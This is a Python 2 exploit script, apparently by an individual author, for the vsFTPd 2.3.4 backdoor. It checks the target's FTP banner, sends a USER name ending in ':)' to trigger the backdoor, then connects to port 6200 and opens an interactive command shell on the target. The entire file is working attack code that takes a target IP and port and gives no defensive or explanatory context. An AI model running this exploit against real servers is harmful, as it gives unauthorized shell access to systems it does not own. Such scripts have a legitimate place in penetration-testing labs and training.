#!/usr/share/python

##################################
#
#
#	Exploit vsFTPd 2.3.4
#
#	Rodrigo das Neves Bernardi
#
#
##################################


import socket 	# Rede
import sys 		# Interacao com sistema
import time		# Espera entre requisicoes
import string	
import random


# Gera strings aleatorias para requisicoes diferentes de USER e PASS
def key_generator(size=4, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))


# Ativa a Backdoor quando enviado uma string de USER com ":)" ao final dessa string
def backdoorTrigger():
	connection_trigger = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		connection_trigger.connect((IP, PORT))

	except Exception:
		print "[!] Target is not available\n"
		sys.exit(1)

	banner = connection_trigger.recv(1024)

	if '2.3.4' in banner:
		print "[*] " + IP + ":" + str(PORT) + " - Service Banner: " + banner

		time.sleep(0.5)
		connection_trigger.send("USER " + key_generator() + ":)\n")
		print "[*] " + IP + ":" + str(PORT) + " - USER: " + connection_trigger.recv(1024)
		time.sleep(0.5)
		connection_trigger.send("PASS " + key_generator() + "\n")
		connection_trigger.close()

		return

	else:
		print "[!] Invalid Service Detected\n"
		sys.exit(1)


# Chama a funcao de ativacao da backdoor e inicia o handler da shell
def shell_handler():
	backdoorTrigger()

	shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		shell.connect((IP, 6200))

	except Exception:
		print "[*] Exploit completed, but no shell has been spawned. Try again.\n"
		sys.exit(1)

	time.sleep(1)
	print "    [+] " + IP + ":" + str(PORT) + " - Backdoor service has been spawned, handling...\n"
	
	shell.send("id\n")
	recv = shell.recv(1024)
	if 'uid' in recv:
		print "    [+] " + IP + ":" + str(PORT) + " - UID: " + recv
		time.sleep(1)
		print "[*] Found shell\n"
		time.sleep(1)
		print "[*] Command shell session opened\n\n"
		time.sleep(0.5)

	shell.settimeout(0.5)
	prompt = "sh-3.2# "
	while True:
		try:
			command = raw_input(prompt)
			if command == 'exit':
				shell.close()
				return
			
			else:
				shell.send(command + "\n")
				print shell.recv(1024)
		
		except Exception:
			pass


# Args: [TARGET IP] [TARGET PORT]
if len(sys.argv) == 3:
	IP = sys.argv[1]
	PORT = int(sys.argv[2])
	pass

else:
	print "usage: python ./" + sys.argv[0] + " [TARGET IP] [TARGET PORT]"
	sys.exit(1)

print ""

try:
	shell_handler()
	print "\n[*] " + IP + " - Command shell session closed.\n"
	sys.exit(0)

except Exception:
	print "[!] ERROR! Exiting...\n"
	sys.exit(1)